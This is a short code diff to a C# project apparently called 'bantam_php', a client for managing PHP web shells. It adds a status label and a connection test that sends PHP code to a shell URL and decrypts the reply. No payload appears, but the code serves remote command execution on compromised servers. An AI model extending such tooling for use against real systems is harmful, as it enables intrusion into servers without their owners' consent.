@@ -46,6 +46,7 @@ namespace bantam_php
 
             comboBoxVarType.SelectedIndex = 0;
             comboBoxEncryptionMode.SelectedIndex = 0;
+            labelDynAddHostsStatus.Text = "";
         }
 
         /// <summary>
@@ -85,6 +86,7 @@ namespace bantam_php
 
             btnAddShell.Visible = false;
             btnUpdateShell.Visible = true;
+            labelDynAddHostsStatus.Text = "";
         }
 
         /// <summary>
@@ -122,6 +124,26 @@ namespace bantam_php
                 BantamMain.Shells[shellURL].gzipRequestData = true;
             } else {
                 BantamMain.Shells[shellURL].gzipRequestData = false;
+            }
+
+            bool encryptResponse = BantamMain.Shells[shellURL].responseEncryption;
+            string phpCode = PhpHelper.PhpTestExecutionWithEcho1(encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellURL, phpCode, encryptResponse);
+
+            if (string.IsNullOrEmpty(response.Result)) {
+                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
+                return;
+            }
+
+            string result = response.Result;
+
+            if (encryptResponse) {
+                result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, BantamMain.Shells[shellURL].responseEncryptionMode);
+            }
+
+            if (string.IsNullOrEmpty(result)) {
+                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
+                return;
             }
 
             Program.g_BantamMain.InitializeShellData(shellURL);
